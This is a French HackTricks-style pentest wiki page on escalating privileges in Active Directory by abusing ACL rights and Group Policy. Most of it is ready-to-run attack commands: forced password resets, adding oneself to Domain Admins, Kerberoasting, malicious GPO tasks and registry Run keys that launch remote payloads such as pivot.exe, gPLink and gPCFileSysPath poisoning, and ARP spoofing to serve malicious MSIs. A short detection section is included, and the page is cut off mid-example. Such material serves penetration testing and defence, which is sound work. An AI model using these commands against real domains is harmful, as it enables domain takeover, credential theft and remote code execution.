# Abus des ACL/ACE Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Cette page est principalement un résumé des techniques présentées dans** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et dans** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles originaux.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Droits GenericAll sur un utilisateur**

Ce privilège donne à un attaquant le contrôle total d’un compte utilisateur cible. Une fois les droits `GenericAll` confirmés à l’aide de la commande `Get-ObjectAcl`, un attaquant peut :

- **Modifier le mot de passe de la cible** : avec `net user <username> <password> /domain`, l’attaquant peut réinitialiser le mot de passe de l’utilisateur.
- Depuis Linux, vous pouvez faire de même via SAMR avec `net` de Samba :<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Si le compte est désactivé, effacez l’indicateur UAC** : `GenericAll` permet de modifier `userAccountControl`. Depuis Linux, BloodyAD peut supprimer l’indicateur `ACCOUNTDISABLE` :<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting** : Attribuer un SPN au compte de l’utilisateur pour le rendre kerberoastable, puis utiliser Rubeus et targetedKerberoast.py pour extraire les hachages du ticket d’octroi de tickets (TGT) et tenter de les casser.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting** : Désactiver la pré-authentification pour l'utilisateur, rendant son compte vulnérable à l'ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link** : Avec `GenericAll` sur un utilisateur, vous pouvez ajouter un identifiant basé sur un certificat et vous authentifier en son nom sans changer son mot de passe. Voir :

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Droits GenericAll sur un groupe**

Ce privilège permet à un attaquant de manipuler les appartenances aux groupes s’il dispose des droits `GenericAll` sur un groupe comme `Domain Admins`. Après avoir identifié le nom distinctif du groupe avec `Get-NetGroup`, l’attaquant peut :

- **S’ajouter au groupe Domain Admins** : Cela peut se faire à l’aide de commandes directes ou de modules comme Active Directory ou PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Depuis Linux, vous pouvez également utiliser BloodyAD pour vous ajouter à des groupes arbitraires si vous disposez des droits GenericAll/Write sur leur membership. Si le groupe cible est imbriqué dans « Remote Management Users », vous obtiendrez immédiatement un accès WinRM aux hôtes qui reconnaissent ce groupe :<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Écriture sur un ordinateur/utilisateur**

Détenir ces privilèges sur un objet ordinateur ou un compte utilisateur permet de :

- **Kerberos Resource-based Constrained Delegation** : prendre le contrôle d’un objet ordinateur.
- **Shadow Credentials** : utiliser cette technique pour usurper l’identité d’un compte ordinateur ou utilisateur en exploitant ces privilèges afin de créer des shadow credentials.

## Déplacer un objet vers une OU dont il héritera des permissions

Il est possible de combiner des **droits de déplacement sur un compte** avec des **droits d’écriture hérités d’une OU de destination**, même si aucun des principaux concernés ne peut initialement modifier les attributs sensibles du compte. Vérifiez les permissions de déplacement de l’objet source et le droit `CreateChild` sur la destination, déplacez l’objet, puis vérifiez à nouveau sa DACL effective. Par exemple, `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` de powerview.py déplace l’utilisateur ; un groupe contrôlé disposant de `GenericWrite` hérité sur cette OU peut alors ajouter un [shadow credential](shadow-credentials.md). Le déplacement ne crée pas à lui seul le droit hérité.<sup>[[18]](#references)</sup>

Si vous disposez de `GenericAll` sur une OU, mais d’aucune ACE héritée appropriée, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` peut en ajouter une pour ses descendants. Vérifiez séparément le compte cible : **l’héritage est désactivé pour les comptes protégés par AdminSDHolder** ; une ACE sur l’OU peut donc s’appliquer aux utilisateurs ordinaires, mais pas à un utilisateur protégé. Voir [AdminSDHolder et SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Il existe un autre chemin d’abus lorsqu’un script privilégié de nettoyage planifié choisit des OU en fonction d’ACE contrôlées par un attaquant, puis exécute `Set-ADObject -Clear adminCount` **et** `$acl.SetAccessRuleProtection($False, $False)` sur leurs descendants. Si vous pouvez modifier la DACL de l’OU, accordez au groupe inspecté par le script l’ACE `ExtendedRight` ou `GenericAll` requise ; vérifiez séparément que vous pouvez déclencher la tâche. La tâche privilégiée peut alors rétablir l’héritage sur un compte précédemment protégé, ce qui permet à l’ACE de l’OU de s’appliquer. Vérifiez le script exact, les permissions nécessaires au déclenchement et la DACL obtenue ; effacer `adminCount` ne réactive pas à lui seul l’héritage, et SDProp peut protéger à nouveau les comptes qui restent dans des groupes protégés.<sup>[[18]](#references)</sup>

## **WriteProperty sur un groupe**

Si un utilisateur dispose de droits `WriteProperty` sur tous les objets d’un groupe spécifique (par exemple, `Domain Admins`), il peut :

- **S’ajouter au groupe Domain Admins** : en combinant les commandes `net user` et `Add-NetGroupUser`, cette méthode permet une élévation de privilèges au sein du domaine.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) sur un groupe**

Ce privilège permet aux attaquants de s’ajouter à des groupes spécifiques, tels que `Domain Admins`, à l’aide de commandes qui modifient directement l’appartenance aux groupes. La séquence de commandes suivante permet de s’ajouter soi-même :

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Privilège similaire, il permet aux attaquants de s’ajouter directement à des groupes en modifiant leurs propriétés s’ils disposent du droit `WriteProperty` sur ces groupes. La vérification et l’exploitation de ce privilège s’effectuent avec :

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Détenir le droit `ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser son mot de passe sans connaître le mot de passe actuel. La vérification de ce droit et son exploitation peuvent se faire avec PowerShell ou d’autres outils en ligne de commande. Plusieurs méthodes permettent de réinitialiser le mot de passe d’un utilisateur, notamment via des sessions interactives ou des commandes sur une seule ligne pour les environnements non interactifs. Les commandes vont de simples appels PowerShell à l’utilisation de `rpcclient` sous Linux, illustrant la diversité des vecteurs d’attaque.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner sur un groupe**

Si un attaquant découvre qu’il dispose des droits `WriteOwner` sur un groupe, il peut s’en attribuer la propriété. Cela est particulièrement important lorsque le groupe concerné est `Domain Admins`, car devenir propriétaire permet de contrôler plus largement les attributs et les membres du groupe. Le processus consiste à identifier l’objet approprié avec `Get-ObjectAcl`, puis à utiliser `Set-DomainObjectOwner` pour modifier son propriétaire, par SID ou par nom.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite sur un utilisateur**

Cette permission permet à un attaquant de modifier les propriétés d’un utilisateur. Plus précisément, avec un accès `GenericWrite`, l’attaquant peut modifier le chemin du script d’ouverture de session d’un utilisateur afin d’exécuter un script malveillant lors de sa connexion. Pour cela, il utilise la commande `Set-ADObject` pour mettre à jour la propriété `scriptpath` de l’utilisateur ciblé et la faire pointer vers le script de l’attaquant.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Un ACE `WriteProperty` plus restreint à l'attribut [`scriptPath` de l'utilisateur](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) peut suffire ; `GenericWrite` n'est pas nécessaire. Associez ce droit sur l'attribut à un script modifiable dans l'arborescence `SYSVOL\<domain>\scripts` ou `NETLOGON` du domaine, puis évaluez si l'utilisateur cible est susceptible de se connecter et d'accéder au script. Le script s'exécute dans le contexte de cet utilisateur lors de sa connexion. Examinez séparément les ACL effectives d'AD et celles des fichiers/partages ; un ACE Allow correspondant ou un répertoire modifiable ne suffit pas à établir le chemin complet.

## **GenericWrite on Group**

Avec ce privilège, les attaquants peuvent manipuler les appartenances aux groupes, par exemple en s'ajoutant eux-mêmes ou en ajoutant d'autres utilisateurs à des groupes spécifiques. Ce processus consiste à créer un objet d'identifiants, à l'utiliser pour ajouter ou supprimer des utilisateurs d'un groupe, puis à vérifier les modifications d'appartenance à l'aide de commandes PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Depuis Linux, Samba `net` peut ajouter/supprimer des membres lorsque vous disposez de `GenericWrite` sur le groupe (utile lorsque PowerShell/RSAT ne sont pas disponibles) :<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Être propriétaire d’un objet AD et disposer de privilèges `WriteDACL` sur celui-ci permet à un attaquant de s’octroyer des privilèges `GenericAll` sur l’objet. Cela se fait en manipulant ADSI, ce qui permet de contrôler entièrement l’objet et de modifier ses appartenances aux groupes. Malgré cela, des limitations existent lorsqu’on tente d’exploiter ces privilèges à l’aide des cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Prise de contrôle rapide avec WriteDACL/WriteOwner (PowerView)

Lorsque vous avez les droits `WriteOwner` et `WriteDacl` sur un utilisateur ou un compte de service, vous pouvez en prendre le contrôle total et réinitialiser son mot de passe avec PowerView sans connaître l’ancien mot de passe :

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notes :
- Vous devrez peut-être d’abord devenir propriétaire si vous n’avez que `WriteOwner` :

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Validez l’accès avec n’importe quel protocole (SMB/LDAP/RDP/WinRM) après la réinitialisation du mot de passe.

## **Réplication sur le domaine (DCSync)**

L’attaque DCSync exploite des autorisations de réplication spécifiques sur le domaine pour se faire passer pour un Domain Controller et synchroniser des données, notamment les identifiants des utilisateurs. Cette technique puissante nécessite des autorisations telles que `DS-Replication-Get-Changes`, qui permettent aux attaquants d’extraire des informations sensibles de l’environnement AD sans accès direct à un Domain Controller.<sup>[[5]](#references)</sup> [**En savoir plus sur l’attaque DCSync.**](../dcsync.md)

## Délégation GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Délégation GPO

L’accès délégué à la gestion des objets de stratégie de groupe (GPO) peut présenter des risques de sécurité importants. Par exemple, si un utilisateur comme `offense\spotless` se voit déléguer des droits de gestion des GPO, il peut disposer de privilèges tels que **WriteProperty**, **WriteDacl** et **WriteOwner**. Ces autorisations peuvent être détournées à des fins malveillantes, comme l’a révélé l’utilisation de PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Énumérer les autorisations GPO

Pour identifier les GPO mal configurées, il est possible d’enchaîner les cmdlets de PowerSploit. Cela permet de découvrir les GPO qu’un utilisateur donné est autorisé à gérer : `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Ordinateurs auxquels une stratégie donnée est appliquée** : Il est possible de déterminer à quels ordinateurs une GPO spécifique s’applique, ce qui aide à comprendre l’étendue de son impact potentiel. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Stratégies appliquées à un ordinateur donné** : Pour voir quelles stratégies sont appliquées à un ordinateur particulier, il est possible d’utiliser des commandes telles que `Get-DomainGPO`.

**OU auxquelles une stratégie donnée est appliquée** : Il est possible d’identifier les unités d’organisation (OU) concernées par une stratégie donnée à l’aide de `Get-DomainOU`.

Vous pouvez également utiliser l’outil [**GPOHound**](https://github.com/cogiceo/GPOHound) pour énumérer les GPO et y détecter des problèmes.

### Détournement de GPO - New-GPOImmediateTask

Les GPO mal configurées peuvent être exploitées pour exécuter du code, par exemple en créant une tâche planifiée immédiate. Cela permet d’ajouter un utilisateur au groupe des administrateurs locaux sur les machines concernées, ce qui élève considérablement ses privilèges :

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### Module GroupPolicy - Abus de GPO

Le module GroupPolicy, s’il est installé, permet de créer et de lier de nouvelles GPO, ainsi que de définir des préférences telles que des valeurs de registre pour exécuter des backdoors sur les ordinateurs concernés. Cette méthode nécessite la mise à jour de la GPO et la connexion d’un utilisateur à l’ordinateur pour que l’exécution ait lieu :

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Abus de GPO

SharpGPOAbuse permet d’abuser des GPO existantes en ajoutant des tâches ou en modifiant des paramètres, sans avoir à créer de nouvelles GPO. Cet outil nécessite de modifier des GPO existantes ou d’utiliser les outils RSAT pour en créer de nouvelles avant d’appliquer les modifications :

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Forcer la mise à jour des stratégies

Les mises à jour des GPO ont généralement lieu environ toutes les 90 minutes. Pour accélérer ce processus, notamment après avoir effectué une modification, la commande `gpupdate /force` peut être utilisée sur l’ordinateur cible afin de forcer une mise à jour immédiate des stratégies. Cette commande garantit que les modifications apportées aux GPO sont appliquées sans attendre le prochain cycle de mise à jour automatique.

### Dans les coulisses

L’inspection des tâches planifiées d’une GPO donnée, comme la `Misconfigured Policy`, permet de confirmer l’ajout de tâches telles que `evilTask`. Ces tâches sont créées à l’aide de scripts ou d’outils en ligne de commande visant à modifier le comportement du système ou à élever les privilèges.

La structure de la tâche, telle qu’elle apparaît dans le fichier de configuration XML généré par `New-GPOImmediateTask`, décrit les détails de la tâche planifiée, notamment la commande à exécuter et ses déclencheurs. Ce fichier montre comment les tâches planifiées sont définies et gérées dans les GPO, et permet d’exécuter des commandes ou des scripts arbitraires dans le cadre de l’application des stratégies.

### Utilisateurs et groupes

Les GPO permettent également de modifier les appartenances aux groupes et aux utilisateurs sur les systèmes cibles. En modifiant directement les fichiers de stratégie Utilisateurs et groupes, les attaquants peuvent ajouter des utilisateurs à des groupes privilégiés, comme le groupe local `administrators`. C’est possible grâce à la délégation des permissions de gestion des GPO, qui permet de modifier les fichiers de stratégie pour y inclure de nouveaux utilisateurs ou changer les appartenances aux groupes.

Le fichier de configuration XML pour Utilisateurs et groupes décrit la mise en œuvre de ces modifications. L’ajout d’entrées à ce fichier permet d’accorder des privilèges élevés à des utilisateurs spécifiques sur les systèmes concernés. Cette méthode offre un moyen direct d’élever ses privilèges en manipulant les GPO.

Pour les paramètres de sécurité tels que les appartenances aux groupes locaux et les droits des utilisateurs, inspectez également le modèle de GPO appliqué à `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` ainsi que l’ACL du répertoire `SecEdit`. Un répertoire ou fichier accessible en écriture constitue une piste à examiner : l’accès effectif au partage SYSVOL, les ACL de refus et héritées, les permissions du conteneur de stratégie de groupe, la portée de la stratégie et l’actualisation côté client déterminent toujours si une modification peut prendre effet. L’appartenance à un groupe nommé « GPO Managers » ne confère pas à elle seule des droits de modification. [Microsoft documente ce chemin de modèle ainsi que la séparation entre le conteneur et le modèle de stratégie de groupe.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

D’autres méthodes d’exécution de code ou de maintien de la persistance peuvent également être envisagées, par exemple l’exploitation des scripts d’ouverture et de fermeture de session, la modification des clés de registre pour les exécutions automatiques, l’installation de logiciels via des fichiers .msi ou la modification des configurations de services. Ces techniques offrent différents moyens de conserver l’accès aux systèmes cibles et de les contrôler en abusant des GPO.

### Rediriger la récupération des GPC/GPT vers des services malveillants authentifiés

Une GPO comprend un **Group Policy Container (GPC)** LDAP contenant des métadonnées et un **Group Policy Template (GPT)** hébergé sur SMB contenant les fichiers de stratégie. Lors de l’actualisation, le client suit le `gPLink` du conteneur, lit le GPC référencé et son `gPCFileSysPath`, puis télécharge le GPT depuis ce chemin UNC. Par conséquent, un accès en écriture au GPC lui-même ou au `gPLink` d’une OU, d’un site ou d’un domaine peut permettre de déclencher le traitement de stratégies avec des privilèges élevés.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Empoisonnement de `gPCFileSysPath` avec GPOddity

Si le principal contrôlé peut écrire dans le GPC cible (directement ou via un **NTLM relay vers LDAP**), remplacez `gPCFileSysPath` par un chemin UNC hébergé par l’attaquant. [GPOddity](https://github.com/synacktiv/GPOddity) automatise la modification LDAP et sert un GPT malveillant contenant des fichiers de stratégie basés sur des modules ou une tâche immédiate que le client Group Policy exécute en tant que `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Un partage SMB anonyme ou ne dépendant pas des identifiants ne suffit pas avec les clients Windows actuels : SMB Secure Negotiate exige la preuve que l’authentification a réussi. Le service malveillant doit donc valider l’identité du domaine, dériver la clé de session SMB et signer correctement ses réponses. En mode intégré, configurez GPOddity avec un compte machine contrôlé et sa clé de service, puis sélectionnez une charge utile côté ordinateur ou côté utilisateur dans la section `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Cas limite des GPO utilisateur :** après MS16-072, Windows crée toujours deux sessions SMB2 dans la **même connexion TCP** : la session utilisateur lit `GPT.INI`, puis la session du compte ordinateur lit la configuration effective, comme `ScheduledTasks.xml`. Un serveur malveillant doit donc indexer l’état d’authentification, les clés de session et les clés de signature par `SessionId` SMB2, et non uniquement par socket. Le fork de Scapy intégré à GPOddity/OUned implémente cela avec `SMBStreamSocketMultiplexing` et un `SMBServer` prenant en charge le multiplexage ; sinon, les serveurs Impacket/Scapy à session unique réutilisent le mauvais état de signature et échouent avec les stratégies utilisateur.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning with OUned

Avec `WriteGPLink`, `GenericWrite` ou un contrôle équivalent sur une OU, un site ou un domaine, un attaquant peut ajouter un lien dont le DN GPC est hébergé par un serveur LDAP contrôlé par l’attaquant. Cette primitive a été présentée à l’origine par Petros Koutroumpis ; [OUned](https://github.com/synacktiv/OUned) automatise l’écriture LDAP et la chaîne GPC/GPT malveillante.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

La victime s’authentifie d’abord auprès du service LDAP malveillant et reçoit un GPC dont le `gPCFileSysPath` pointe vers le service SMB malveillant ; elle s’authentifie ensuite auprès de SMB et applique le GPT fourni. OUned a donc besoin d’un compte avec un SPN LDAP, d’un compte machine avec un SPN HOST pour SMB (le même compte machine peut remplir les deux rôles), ainsi que d’une résolution DNS ou d’une redirection inverse qui achemine les ports 389 et 445 vers la machine de l’opérateur.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

Le serveur LDAP Scapy intégré d’OUned valide Kerberos/SPNEGO avec la véritable clé du service contrôlé et fournit des données GPC arbitraires à partir de JSON. La clé JSON vide représente rootDSE, les préfixes `base64:` représentent des valeurs binaires, et le serveur prend en charge les opérations add/delete/modify/search ainsi que les recherches `BASE`, `LEVEL` et `SUBTREE` ; il peut négocier l’absence de protection, l’intégrité ou la confidentialité. Le service est ainsi réutilisable lorsqu’un autre composant Windows suit une référence LDAP contrôlée par un attaquant, mais exige une authentification LDAP.<sup>[[15]](#references)</sup>

Ne partez pas du principe que la synchronisation du mot de passe d’un compte dans un domaine factice reproduit toutes les clés Kerberos : RC4 est dérivé du mot de passe, tandis que la dérivation AES string-to-key utilise aussi un salt dérivé du nom d’hôte/domaine du principal. Fournir la véritable clé AES du compte à `KerberosSSP` évite de forcer l’utilisation de RC4 en modifiant de manière détectable le `msDS-SupportedEncryptionTypes` du compte machine, attribut que celui-ci peut modifier lui-même.<sup>[[15]](#references)</sup>

#### Points de détection

Corrélez les modifications de `gPCFileSysPath` ou de `gPLink` avec les changements de version des GPO et les nouveaux fichiers XML Immediate/Scheduled Task. Examinez les liens vers des contextes de nommage inattendus, les hôtes UNC hors de l’ensemble approuvé DC/SYSVOL, les enregistrements DNS qui redirigent les noms de comptes machine, les tickets de service LDAP/CIFS pour des comptes machine inhabituels et les modifications de `msDS-SupportedEncryptionTypes` qui activent RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + détournement de chemin UNC (ARP spoofing)

`WriteGPLink` sur une OU/un domaine permet de modifier l’attribut `gPLink` du conteneur cible et de **forcer l’application d’un GPO existant** sans modifier le GPO lui-même. Cela devient intéressant lorsque le GPO lié référence déjà du contenu distant via des **chemins UNC** (`\\HOST\share\...`), car les utilisateurs authentifiés peuvent lire **SYSVOL** et rechercher hors ligne des stratégies réutilisables.<sup>[[11]](#references)</sup>

Déroulement général :

1. Utilisez BloodHound pour identifier un principal disposant de `WriteGPLink` sur une OU et répertoriez les ordinateurs/utilisateurs de cette OU.
2. Clonez `SYSVOL` en lecture seule et analysez les GPO à la recherche de **Software Installation**, de **mappages de lecteurs** (`Drives.xml`) et de **scripts de connexion/démarrage** qui référencent des chemins UNC.
3. Privilégiez les stratégies pointant vers un **nom d’hôte direct** (par exemple `\\DC02\share\pkg.msi`) plutôt que vers des chemins DFS/d’espace de noms de domaine, car les chemins basés sur un nom d’hôte sont plus faciles à rediriger par spoofing L2.
4. Ajoutez le GUID du GPO choisi au `gPLink` de l’OU cible afin que la victime traite cette stratégie déjà existante.
5. Sur le même domaine de diffusion, effectuez un ARP spoofing de l’hôte UNC et liez son IP localement (`ip addr add <target_ip>/32 dev <iface>`) afin que le trafic SMB de la victime atteigne votre hôte.
6. Fournissez le chemin/nom de fichier attendu depuis un serveur SMB contrôlé par l’attaquant (par exemple `smbserver.py`), puis attendez le traitement normal de la stratégie.

Exemple de collecte de `SYSVOL` et de corrélation des GPO :

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Lier le GPO existant à l’OU cible :

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Si la GPO liée déploie un MSI depuis un chemin UNC, le client le récupérera au **démarrage de l’ordinateur** et l’installera en tant que **`NT AUTHORITY\SYSTEM`**. En usurpant l’hôte référencé et en hébergeant un MSI malveillant sous le **même partage/chemin/nom**, vous pouvez transformer `WriteGPLink` en exécution de code en tant que SYSTEM **sans modifier SYSVOL**.

Contraintes importantes :

- **Le timing est important** : le nouveau lien est pris en compte lors de l’actualisation des stratégies (généralement toutes les ~90 minutes), mais **Software Installation** se déclenche généralement au **redémarrage**.
- Windows Installer suit généralement le déploiement à l’aide du **`ProductCode`** du package. Si le produit est déjà installé, le déploiement peut être ignoré.
- Pour éviter que le programme d’installation ne rejette le MSI, modifiez le MSI malveillant afin que son **`ProductCode`** et son **`PackageCode`** correspondent à ceux du package légitime attendu par la GPO.
- D’anciens fichiers d’annonce `.aas` peuvent subsister dans `SYSVOL` ; vérifiez donc que le déploiement semble toujours actif avant de vous y fier.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Détournement de mappage de lecteur UNC -> capture NTLM / relais WebDAV

Les mappages de lecteurs GPP dans `Drives.xml` amènent les utilisateurs à s’authentifier auprès du chemin UNC configuré lors de l’ouverture de session ou de la reconnexion. Si vous usurpez l’hôte référencé, vous pouvez capturer **NetNTLMv2**. Si SMB est délibérément mis en échec, Windows peut réessayer via **WebDAV**, en envoyant **NTLM sur HTTP**, ce qui offre beaucoup plus de possibilités de relais vers **LDAP(S)**, **AD CS** ou **SMB**.

#### Détournement d’un script d’ouverture de session/de démarrage via UNC

Le même principe s’applique aux scripts hébergés sur un chemin UNC et découverts dans `SYSVOL` :

- Les **scripts d’ouverture de session** s’exécutent généralement dans le contexte de l’**utilisateur**.
- Les **scripts de démarrage** s’exécutent généralement dans le contexte de l’**ordinateur / SYSTEM**.

Si le chemin du script pointe vers un nom d’hôte usurpable, redirigez l’hôte UNC et servez le contenu de script de remplacement depuis l’emplacement attendu.

## Empoisonnement des scripts d’ouverture de session SYSVOL/NETLOGON

Les chemins modifiables sous `\\<dc>\SYSVOL\<domain>\scripts\` ou `\\<dc>\NETLOGON\` permettent de falsifier les scripts d’ouverture de session exécutés lors de la connexion d’un utilisateur via GPO. Cela permet l’exécution de code dans le contexte de sécurité des utilisateurs qui ouvrent une session.

### Localiser les scripts d’ouverture de session
- Examinez les attributs utilisateur pour repérer un script d’ouverture de session configuré :

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Parcourir les partages du domaine pour repérer des raccourcis ou des références à des scripts :

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Analyser les fichiers `.lnk` pour résoudre les cibles pointant vers SYSVOL/NETLOGON (astuce DFIR utile pour les attaquants sans accès direct aux GPO) :

```bash
# LnkParse3
